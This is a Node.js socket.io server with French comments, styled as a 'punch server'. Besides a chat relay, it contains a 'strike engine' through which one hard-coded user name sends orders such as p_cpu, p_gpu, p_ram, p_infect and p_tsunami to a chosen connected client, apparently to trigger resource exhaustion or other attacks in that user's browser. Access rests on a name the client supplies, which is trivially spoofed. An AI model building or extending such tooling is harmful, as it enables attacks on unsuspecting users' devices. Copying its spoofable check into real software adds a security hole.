const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Stockage des utilisateurs connectés
let users = [];

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    console.log(`[CONNEXION] Nouvelle entité détectée : ${socket.id}`);

    // Initialisation d'un utilisateur
    socket.on('init', (data) => {
        const newUser = {
            id: socket.id,
            name: data.name || "Inconnu",
            chef: data.name === "toucheur2pp"
        };
        users.push(newUser);
        
        // On renvoie la liste à tout le monde pour mettre à jour l'interface
        io.emit('sync', users);
        console.log(`[SYNC] ${newUser.name} a rejoint le champ de bataille.`);
    });

    // Gestion du Chat
    socket.on('chat', (msg) => {
        const user = users.find(u => u.id === socket.id);
        if (user) {
            io.emit('chat', { n: user.name, t: msg });
        }
    });

    // --- MOTEUR DE STRIKE (TRANSFERT D'ORDRE) ---
    // Chaque événement correspond à une option de ton menu contextuel
    
    const strikeTypes = [
        'p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 
        'p_ios', 'p_ram', 'p_infect', 'p_sonic'
    ];

    strikeTypes.forEach(type => {
        socket.on(type, (targetId) => {
            const sender = users.find(u => u.id === socket.id);
            // Sécurité : Seul le chef peut déclencher les attaques
            if (sender && sender.name === "toucheur2pp") {
                console.log(`[STRIKE] ${type.toUpperCase()} envoyé vers ${targetId}`);
                // On envoie l'ordre uniquement à la cible
                io.to(targetId).emit('execute', { type: type });
            }
        });
    });

    // Déconnexion
    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        io.emit('sync', users);
        console.log(`[DECONNEXION] Entité retirée : ${socket.id}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`
    🥊 PUNCH SERVER V95 [THE WORLD] ACTIVE
    --------------------------------------
    > Adresse locale : http://localhost:${PORT}
    > Statut : ZA WARUNDO MODE ON
    --------------------------------------
    `);
});
